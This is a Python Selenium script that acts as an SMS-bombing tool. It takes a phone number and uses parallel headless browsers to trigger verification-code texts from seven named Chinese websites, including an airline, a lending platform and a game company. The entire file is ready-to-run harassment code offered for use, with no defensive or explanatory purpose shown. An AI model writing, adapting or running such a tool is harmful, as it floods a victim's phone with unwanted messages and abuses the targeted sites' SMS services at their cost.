from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import threading


# 拍拍贷
def send_paipai(phon_num):
    option = webdriver.EdgeOptions()
    option.add_argument('headless')
    browser = webdriver.Edge(options=option)
    browser.get("https://account.ppdai.com/pc/login")
    time.sleep(3)
    browser.find_element(By.ID, "login_returnSms").click()
    browser.find_element(By.ID, "Mobile").send_keys(phon_num)
    browser.find_element(By.ID, "btnSendSms").click()
    time.sleep(2)
    browser.close()


# 巨人网络
def send_juren(phon_num):
    option = webdriver.EdgeOptions()
    option.add_argument('headless')
    browser = webdriver.Edge(options=option)
    browser.get('https://reg.ztgame.com/')
    time.sleep(3)
    browser.find_element(
        By.CSS_SELECTOR, '[jslog-trace-id="phone"]').send_keys(phon_num)
    browser.find_element(By.NAME, 'get_mpcode').click()
    time.sleep(3)
    browser.close()


# 四川航空
def send_chuanhang(phon_num):
    option = webdriver.EdgeOptions()
    option.add_argument('headless')
    browser = webdriver.Edge(options=option)
    browser.get(
        'https://flights.sichuanair.com/3uair/ibe/profile/createProfile.do')
    time.sleep(3)
    browser.find_element(By.NAME, 'mobilePhone').send_keys(phon_num)
    browser.find_element(By.ID, "sendSmsCode").click()
    time.sleep(2)
    browser.close()

# 武商网
def send_wushang(phon_num):
    option = webdriver.EdgeOptions()
    option.add_argument('headless')
    browser = webdriver.Edge(options=option)
    browser.get('https://www.wushang.com/register/')
    time.sleep(5)
    browser.find_element(By.XPATH,'//input[@placeholder="输入手机号"]').send_keys(phon_num)
    time.sleep(2)
    browser.find_element(By.ID, 'inner_61a9647a-f874-4a7d-a3d2-d02b52011280').click()
    time.sleep(2)
    browser.close()

# 彩云科技
def send_caiyun(phon_num):
    option = webdriver.EdgeOptions()
    option.add_argument('headless')
    browser = webdriver.Edge(options=option)
    browser.get("https://caiyunapp.com/user/login/")
    time.sleep(5)
    browser.find_element(By.ID, "phonenum").send_keys(phon_num)
    time.sleep(1)
    browser.find_element(By.ID, "second").click()
    time.sleep(2)
    browser.close()

# php中文网
def send_phpzw(phon_num):
    option = webdriver.EdgeOptions()
    option.add_argument('headless')
    browser = webdriver.Edge(options=option)
    browser.get("https://m.php.cn/login")
    time.sleep(3)
    browser.find_element(By.ID, "telphone_login").send_keys(phon_num)
    browser.find_element(By.ID, "user_phone_code_button").click()
    time.sleep(2)
    browser.close()

# spump
def send_spump(phon_num):
    option = webdriver.EdgeOptions()
    option.add_argument('headless')
    browser = webdriver.Edge(options=option)
    browser.get("https://v3.cnppump.ltd/#/CN/login/tel?utp=0")
    time.sleep(4)
    browser.find_element(By.ID, 'sign-up-btn').click()
    time.sleep(2)
    browser.find_element(By.XPATH,'//input[@placeholder="请输入手机号"]').send_keys(phon_num)
    browser.find_element(By.CLASS_NAME, "el-button").click()
    time.sleep(2)
    browser.close()


phon_num = input('请输入手机号码：')   
threads = []     
t1 = threading.Thread(target=send_paipai, args=(phon_num,))  
t2 = threading.Thread(target=send_juren, args=(phon_num,))  
t3 = threading.Thread(target=send_chuanhang, args=(phon_num,))  
t4 = threading.Thread(target=send_wushang, args=(phon_num,))
t5 = threading.Thread(target=send_caiyun,args=(phon_num,))     
t6 = threading.Thread(target=send_phpzw,args=(phon_num,))
t7 = threading.Thread(target=send_spump,args=(phon_num,))    
t1.start()  
t2.start()  
t3.start()  
t4.start()    
t5.start()
t6.start()
t7.start()
threads.append(t1)  
threads.append(t2)  
threads.append(t3)  
threads.append(t4)  
threads.append(t5)  
threads.append(t6)
threads.append(t7) 

for t in threads:  
    t.join()  
  
print("已发送完成")